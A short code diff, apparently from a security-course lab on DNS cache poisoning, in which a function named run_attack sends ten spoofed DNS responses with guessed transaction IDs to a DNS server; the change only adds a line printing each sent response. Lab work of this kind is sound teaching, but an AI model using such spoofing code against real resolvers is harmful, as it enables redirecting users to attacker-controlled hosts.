@@ -221,6 +221,7 @@ void run_attack(uint32_t *txid_ls) {
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
         send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
     }
     
     // Close the connection
